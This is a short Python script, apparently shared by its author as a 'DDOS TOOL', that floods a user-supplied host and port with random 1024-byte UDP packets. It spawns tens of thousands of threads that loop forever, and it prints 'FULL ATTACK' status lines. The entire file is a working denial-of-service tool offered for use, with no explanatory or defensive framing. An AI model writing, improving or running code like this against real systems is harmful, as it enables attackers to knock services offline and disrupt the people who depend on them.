#REMAKE BY AWANG
#udp attack
import random
import socket
import threading
import time

print("DDOS TOOL BY AWANG")
print("GAUSAH SOK KERAS ")
ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
choice = str(input(" UDP:"))
times = 90048
threads = 90048
def run():
	data = random._urandom(1024)
	i = random.choice(("[*-]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"FULL ATTACK")
		except:
			print(i +"LOW ATTACK ")

for y in range(threads):
	if choice == 'UDP':
		th = threading.Thread(target = run)
		th.start()